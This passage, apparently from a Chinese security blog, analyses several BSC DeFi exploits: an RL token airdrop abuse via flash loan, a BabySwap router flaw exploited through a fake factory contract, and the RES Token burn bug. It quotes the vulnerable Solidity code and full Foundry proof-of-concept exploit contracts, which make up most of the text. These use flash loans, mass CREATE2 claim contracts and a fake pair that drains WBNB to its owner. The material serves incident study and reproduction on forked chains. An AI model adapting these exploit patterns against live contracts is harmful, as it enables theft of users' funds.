</span>&#123;</span><br><span class="line">        <span class="comment">// cheats.createSelectFork("bsc", 21794289);</span></span><br><span class="line">        cheats.createSelectFork(<span class="string">"bsc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">testExploit</span>(<span class="params"></span>) <span class="title">external</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            <span class="string">"[Start] Attacker USDT balance before exploit"</span>,</span><br><span class="line">            USDT.balanceOf(address(<span class="keyword">this</span>)),</span><br><span class="line">            <span class="number">18</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        USDT.approve(address(Router), ~uint256(<span class="number">0</span>));</span><br><span class="line">        RL.approve(address(Router), ~uint256(<span class="number">0</span>));</span><br><span class="line">        Pair.approve(address(Router), ~uint256(<span class="number">0</span>));</span><br><span class="line">        airDropContractFactory();</span><br><span class="line">        <span class="comment">//change timestamp to pass check</span></span><br><span class="line">        <span class="comment">// cheats.warp(block.timestamp + 24 * 60 * 60);</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~"</span>);</span><br><span class="line">        dodo.flashLoan(<span class="number">0</span>, <span class="number">450</span>_000 * <span class="number">1e18</span>, address(<span class="keyword">this</span>), <span class="keyword">new</span> bytes(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// dodo.flashLoan(0, 45 * 1e18, address(this), new bytes(1));</span></span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            <span class="string">"[End] Attacker USDT balance after exploit"</span>,</span><br><span class="line">            USDT.balanceOf(address(<span class="keyword">this</span>)),</span><br><span class="line">            <span class="number">18</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">DPPFlashLoanCall</span>(<span class="params">address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data</span>) <span class="title">external</span></span>&#123;</span><br><span class="line">        buyRLAndAddLiquidity();</span><br><span class="line">        <span class="comment">//claimAirDrop</span></span><br><span class="line">        <span class="keyword">for</span>(uint i = <span class="number">0</span>; i &lt; contractAddress.length; i++)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~"</span>,Pair.balanceOf(address(<span class="keyword">this</span>)));</span><br><span class="line">            Pair.transfer(contractAddress[i], Pair.balanceOf(address(<span class="keyword">this</span>)));</span><br><span class="line">            (bool success,) = contractAddress[i].call(abi.encodeWithSignature(<span class="string">"airDropReward(address)"</span>, address(<span class="keyword">this</span>)));</span><br><span class="line">            <span class="built_in">require</span>(success);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        removeLiquidityAndSellRL();</span><br><span class="line">        USDT.transfer(msg.sender, <span class="number">450</span>_000 * <span class="number">1e18</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">buyRLAndAddLiquidity</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        address [] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = address(USDT);</span><br><span class="line">        path[<span class="number">1</span>] = address(RL);</span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            <span class="number">150</span>_000 * <span class="number">1e18</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            address(<span class="keyword">this</span>),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        Router.addLiquidity(</span><br><span class="line">            address(USDT),</span><br><span class="line">            address(RL),</span><br><span class="line">            USDT.balanceOf(address(<span class="keyword">this</span>)),</span><br><span class="line">            RL.balanceOf(address(<span class="keyword">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            address(<span class="keyword">this</span>),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeLiquidityAndSellRL</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        Router.removeLiquidity(</span><br><span class="line">            address(USDT),</span><br><span class="line">            address(RL),</span><br><span class="line">            Pair.balanceOf(address(<span class="keyword">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            address(<span class="keyword">this</span>),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        address [] memory path = <span class="keyword">new</span> address[](<span class="number">2</span>);</span><br><span class="line">        path[<span class="number">0</span>] = address(RL);</span><br><span class="line">        path[<span class="number">1</span>] = address(USDT);</span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            RL.balanceOf(address(<span class="keyword">this</span>)),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            path,</span><br><span class="line">            address(<span class="keyword">this</span>),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">airDropContractFactory</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        address _add;</span><br><span class="line">        bytes memory bytecode = type(AirDropRewardContract).creationCode;</span><br><span class="line">        <span class="keyword">for</span>(uint _salt = <span class="number">0</span>; _salt &lt; <span class="number">100</span>; _salt++)&#123;</span><br><span class="line">            assembly&#123;</span><br><span class="line">                _add := create2(<span class="number">0</span>, add(bytecode, <span class="number">32</span>), mload(bytecode), _salt)</span><br><span class="line">            &#125;</span><br><span class="line">            contractAddress.push(_add);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复现代码使用Foundry框架，和HackLabs中给的攻击代码稍有改动。</p><p>执行<code>forge test --contracts src/test/RL_exp.sol -vvvv</code>即可</p><p>此测试执行结果会报一个balance不足的错，是因为被攻击合约地址已经停止使用，没有余额了。</p><p><img src="RP_exp.png" alt=""></p><h1 id="Insufficient-validation"><a href="#Insufficient-validation" class="headerlink" title="Insufficient validation"></a>Insufficient validation</h1><h2 id="漏洞：swap底层函数缺少检查"><a href="#漏洞：swap底层函数缺少检查" class="headerlink" title="漏洞：swap底层函数缺少检查"></a>漏洞：swap底层函数缺少检查</h2><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先来看babyswap当中BabySmartRouter.sol的源码</p><p><a href="https://bscscan.com/address/0x8317c460c22a9958c27b4b6403b98d2ef4e2ad32#code#F14#L89" target="_blank" rel="noopener">https://bscscan.com/address/0x8317c460c22a9958c27b4b6403b98d2ef4e2ad32#code#F14#L89</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swapExactTokensForTokens</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        uint amountIn,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint amountOutMin,</span></span></span><br><span class="line"><span class="function"><span class="params">        address[] memory path,</span></span></span><br><span class="line"><span class="function"><span class="params">        address[] memory factories,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint[] memory fees,</span></span></span><br><span class="line"><span class="function"><span class="params">        address to,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint deadline</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">external</span> <span class="title">virtual</span> <span class="title">override</span> <span class="title">ensure</span>(<span class="params">deadline</span>) <span class="title">returns</span> (<span class="params">uint[] memory amounts</span>) </span>&#123;</span><br><span class="line">        amounts = BabyLibrarySmartRouter.getAggregationAmountsOut(factories, fees, amountIn, path);</span><br><span class="line">        <span class="built_in">require</span>(amounts[amounts.length - <span class="number">1</span>] &gt;= amountOutMin, <span class="string">'BabyRouter: INSUFFICIENT_OUTPUT_AMOUNT'</span>);</span><br><span class="line">        amounts[<span class="number">0</span>] = routerFee(factories[<span class="number">0</span>], msg.sender, path[<span class="number">0</span>], amounts[<span class="number">0</span>]);</span><br><span class="line">        TransferHelper.safeTransferFrom(</span><br><span class="line">            path[<span class="number">0</span>], msg.sender, BabyLibrarySmartRouter.pairFor(factories[<span class="number">0</span>], path[<span class="number">0</span>], path[<span class="number">1</span>]), amounts[<span class="number">0</span>]</span><br><span class="line">        );</span><br><span class="line">        _swap(amounts, path, factories, to); <span class="comment">//vulnerable point - Insufficient validation</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>SwapMining.sol</p><p><a href="https://bscscan.com/address/0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636#code#F4#L236" target="_blank" rel="noopener">https://bscscan.com/address/0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636#code#F4#L236</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// swapMining only router</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">address account, address input, address output, uint256 amount</span>) <span class="title">public</span> <span class="title">onlyRouter</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(account != address(<span class="number">0</span>), <span class="string">"SwapMining: taker swap account is the zero address"</span>);</span><br><span class="line">        <span class="built_in">require</span>(input != address(<span class="number">0</span>), <span class="string">"SwapMining: taker swap input is the zero address"</span>);</span><br><span class="line">        <span class="built_in">require</span>(output != address(<span class="number">0</span>), <span class="string">"SwapMining: taker swap output is the zero address"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (poolLength() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!isWhitelist(input) || !isWhitelist(output)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        address pair = BabyLibrary.pairFor(address(factory), input, output);</span><br><span class="line">        PoolInfo storage pool = poolInfo[pairOfPid[pair]];</span><br><span class="line">        <span class="comment">// If it does not exist or the allocPoint is 0 then return</span></span><br><span class="line">        <span class="keyword">if</span> (pool.pair != pair || pool.allocPoint &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 quantity = getQuantity(output, amount, targetToken);</span><br><span class="line">        <span class="keyword">if</span> (quantity &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mint(pairOfPid[pair]);</span><br><span class="line"></span><br><span class="line">        pool.quantity = pool.quantity.add(quantity);</span><br><span class="line">        pool.totalQuantity = pool.totalQuantity.add(quantity);</span><br><span class="line">        UserInfo storage user = userInfo[pairOfPid[pair]][account];</span><br><span class="line">        user.quantity = user.quantity.add(quantity);</span><br><span class="line">        user.blockNumber = block.number;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>特别注意<code>swapExactTokensForTokens</code>这个函数，他仿造了uniswap的代码，但是他重写了底层的swap的逻辑。</p><p>而我们知道uniswap之所以在执行swap的时候不需要进行额外的检查，是因为底层的swap有一个严格的K值检查，但是此swap的逻辑仅仅是计算奖励到user头上，没有进行任何检查。这就造成了<strong>检查不足</strong>的严重问题</p><p>攻击复现：</p><p>依旧是Foundry下的复现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std&#x2F;Test.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;interface.sol&quot;;</span><br><span class="line">import &quot;forge-std&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; @Analysis</span><br><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;twitter.com&#x2F;BlockSecTeam&#x2F;status&#x2F;1576441612812836865</span><br><span class="line">&#x2F;&#x2F; @TX</span><br><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;bscscan.com&#x2F;tx&#x2F;0xcca7ea9d48e00e7e32e5d005b57ec3cac28bc3ad0181e4ca208832e62aa52efe</span><br><span class="line">interface BabySwapRouter &#123;</span><br><span class="line">    function swapExactTokensForTokens(</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address[] memory path,</span><br><span class="line">        address[] memory factories,</span><br><span class="line">        uint[] memory fees,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface SwapMining &#123;</span><br><span class="line">    function takerWithdraw() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FakeFactory &#123;</span><br><span class="line">    address Owner;</span><br><span class="line">    IERC20 WBNB &#x3D; IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);</span><br><span class="line">    IERC20 USDT &#x3D; IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        Owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; fake pair</span><br><span class="line">    function getPair(address token1, address token2) external view returns(address pair) &#123;</span><br><span class="line">        pair &#x3D; address(this);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; fake pair</span><br><span class="line">    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) &#123;</span><br><span class="line">        reserve0 &#x3D; 10_000_000_000 * 1e18;</span><br><span class="line">        reserve1 &#x3D; 1;</span><br><span class="line">        blockTimestampLast &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function swap(</span><br><span class="line">    uint256 amount0Out,</span><br><span class="line">    uint256 amount1Out,</span><br><span class="line">    address to,</span><br><span class="line">    bytes calldata data</span><br><span class="line">  ) external&#123;</span><br><span class="line">    if(WBNB.balanceOf(address(this)) &gt; 0) WBNB.transfer(Owner, WBNB.balanceOf(address(this)));</span><br><span class="line">    &#x2F;&#x2F; if(USDT.balanceOf(address(this)) &gt; 0) USDT.transfer(Owner, USDT.balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ContractTest is DSTest&#123;</span><br><span class="line"></span><br><span class="line">    IERC20 WBNB &#x3D; IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);</span><br><span class="line">    IERC20 USDT &#x3D; IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line">    IERC20 BABY &#x3D; IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);</span><br><span class="line">    BabySwapRouter Router &#x3D; BabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);</span><br><span class="line">    SwapMining swapMining &#x3D; SwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);</span><br><span class="line"></span><br><span class="line">    CheatCodes cheats &#x3D; CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        &#x2F;&#x2F; cheats.createSelectFork(&quot;bsc&quot;, 21811979);</span><br><span class="line">        cheats.createSelectFork(&quot;bsc&quot;, 22629431);</span><br><span class="line">        &#x2F;&#x2F; cheats.createSelectFork(&quot;bsc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public&#123;</span><br><span class="line"></span><br><span class="line">        address(WBNB).call&#123;value: 20_000&#125;(&quot;&quot;);</span><br><span class="line">        WBNB.approve(address(Router), type(uint).max);</span><br><span class="line">        BABY.approve(address(Router), type(uint).max);</span><br><span class="line">        &#x2F;&#x2F; create fakefactory</span><br><span class="line">        FakeFactory factory &#x3D; new FakeFactory();</span><br><span class="line">        &#x2F;&#x2F; swap token to claim reward</span><br><span class="line">        address [] memory path1 &#x3D; new address[](2);</span><br><span class="line">        path1[0] &#x3D; address(WBNB);</span><br><span class="line">        path1[1] &#x3D; address(USDT);</span><br><span class="line">        address [] memory factories &#x3D; new address[](1);</span><br><span class="line">        factories[0] &#x3D; address(factory);</span><br><span class="line">        uint [] memory fees &#x3D; new uint[](1);</span><br><span class="line">        fees[0] &#x3D; 0;</span><br><span class="line">        Router.swapExactTokensForTokens(</span><br><span class="line">            10_000,</span><br><span class="line">            0,</span><br><span class="line">            path1,</span><br><span class="line">            factories,</span><br><span class="line">            fees,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">            );</span><br><span class="line">        &#x2F;&#x2F; swap token to claim reward</span><br><span class="line">        address [] memory path2 &#x3D; new address[](2);</span><br><span class="line">        path2[0] &#x3D; address(WBNB);</span><br><span class="line">        path2[1] &#x3D; address(BABY);</span><br><span class="line">        Router.swapExactTokensForTokens(</span><br><span class="line">            10_000,</span><br><span class="line">            0, </span><br><span class="line">            path2,</span><br><span class="line">            factories,</span><br><span class="line">            fees,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">            );</span><br><span class="line">        &#x2F;&#x2F; calim reward token</span><br><span class="line">        swapMining.takerWithdraw();</span><br><span class="line">        sellBaby();</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;[End] Attacker USDT balance after exploit&quot;,</span><br><span class="line">            USDT.balanceOf(address(this)),</span><br><span class="line">            18</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sellBaby() internal &#123;</span><br><span class="line">        console.log(&quot;~~~~&quot;,BABY.balanceOf(address(this)));</span><br><span class="line">        address [] memory path &#x3D; new address[](2);</span><br><span class="line">        path[0] &#x3D; address(BABY);</span><br><span class="line">        path[1] &#x3D; address(USDT);</span><br><span class="line">        address [] memory factories &#x3D; new address[](1);</span><br><span class="line">        factories[0] &#x3D; address(0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da);</span><br><span class="line">        uint [] memory fees &#x3D; new uint[](1);</span><br><span class="line">        fees[0] &#x3D; 3000;</span><br><span class="line">        </span><br><span class="line">        Router.swapExactTokensForTokens(</span><br><span class="line">            BABY.balanceOf(address(this)),</span><br><span class="line">            0, </span><br><span class="line">            path,</span><br><span class="line">            factories,</span><br><span class="line">            fees,</span><br><span class="line">            address(this),</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击者可以创建了假工厂合同以获得真正的奖励令牌</p><h1 id="RES-Token"><a href="#RES-Token" class="headerlink" title="RES Token"></a>RES Token</h1><p>这次攻击发生在2022年10月6日，RES Token被发现有严重漏洞，最终导致持有该代币的用户遭受290K美元的损失。</p><h2 id="漏洞：不正确的奖励计算方式，owner判断不足"><a href="#漏洞：不正确的奖励计算方式，owner判断不足" class="headerlink" title="漏洞：不正确的奖励计算方式，owner判断不足"></a>漏洞：不正确的奖励计算方式，owner判断不足</h2><p>这是ERS Token的漏洞代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_transfer</span>(<span class="params">address sender, address recipient, uint256 amount</span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(!_blacklist[tx.origin], <span class="string">"blacklist!"</span>);</span><br><span class="line">        <span class="built_in">require</span>(!isContract(recipient) || _whiteContract[recipient] || sender == owner() || recipient == owner(), <span class="string">"no white contract"</span>);</span><br><span class="line">        <span class="built_in">require</span>(sender != address(<span class="number">0</span>), <span class="string">"BEP20: transfer from the zero address"</span>);</span><br><span class="line">        <span class="built_in">require</span>(recipient != address(<span class="number">0</span>), <span class="string">"BEP20: transfer to the zero address"</span>);</span><br><span class="line">        <span class="built_in">require</span>(recipient != address(<span class="keyword">this</span>), <span class="string">"transfer fail"</span>);</span><br><span class="line">        <span class="built_in">require</span>(_allToken != address(<span class="number">0</span>), <span class="string">"no set allToken"</span>);</span><br><span class="line">        <span class="keyword">if</span>(sender != owner() &amp;&amp; recipient != owner() &amp;&amp; IPancakePair(_swapV2Pair).totalSupply() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">require</span>(recipient != _swapV2Pair,<span class="string">"no start"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount, <span class="string">"BEP20: transfer amount exceeds balance"</span>);</span><br><span class="line">        </span><br><span class="line">        bool skip = _isSkip(sender, recipient);</span><br><span class="line">        TransferType transferType = _transferType(sender, recipient);</span><br><span class="line">        </span><br><span class="line">        uint256 amountRecipient = amount;</span><br><span class="line">        <span class="keyword">if</span> (!_lockSwapFee &amp;&amp; !skip &amp;&amp; transferType != TransferType.TRANSFER)&#123;</span><br><span class="line">            <span class="keyword">if</span> (transferType == TransferType.SWAP_BUY)&#123;</span><br><span class="line">                <span class="keyword">if</span> (_isBuySwap(amount))&#123;</span><br><span class="line">                    amountRecipient = amount.mul(uint256(<span class="number">100</span>).sub(_buyFee)).div(<span class="number">100</span>);</span><br><span class="line">                    _distBuyFee(recipient, amount.mul(_buyFee).div(<span class="number">100</span>)); <span class="comment">//Get ALLtoken reward</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(transferType == TransferType.SWAP_SELL)&#123;</span><br><span class="line">                <span class="keyword">if</span> (_isSellSwap(amount))&#123;</span><br><span class="line">                    amountRecipient = amount.mul(uint256(<span class="number">100</span>).sub(_sellFee)).div(<span class="number">100</span>);</span><br><span class="line">                    _distSellFee(sender, amount.mul(_sellFee).div(<span class="number">100</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (transferType == TransferType.TRANSFER)&#123;</span><br><span class="line">            _thisAToB(); <span class="comment">//vulnerable point - burn RES</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_thisAToB</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (_balances[address(<span class="keyword">this</span>)] &gt; _minAToB)&#123;</span><br><span class="line">            uint256 burnNumber = _balances[address(<span class="keyword">this</span>)];</span><br><span class="line">            _approve(address(<span class="keyword">this</span>),_pancakeRouterToken, _balances[address(<span class="keyword">this</span>)]);</span><br><span class="line">            IPancakeRouter(_pancakeRouterToken).swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">                _balances[address(<span class="keyword">this</span>)],</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                _pathAToB,</span><br><span class="line">                address(<span class="keyword">this</span>),</span><br><span class="line">                block.timestamp);</span><br><span class="line">            _burn(_swapV2Pair, burnNumber);  <span class="comment">//vulnerable point</span></span><br><span class="line">            IPancakePair(_swapV2Pair).sync();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>攻击者进行了多次交换以获得持有者全部的代币，并燃烧RES代币以提高兑换率。</p><p>完整的攻击流程如下：</p><p><img src="RES_flow.png" alt=""></p><p>tx：<a href="https://bscscan.com/tx/0x181a7882aac0eab1036eedba25bc95a16e10f61b5df2e99d240a16c334b9b189" target="_blank" 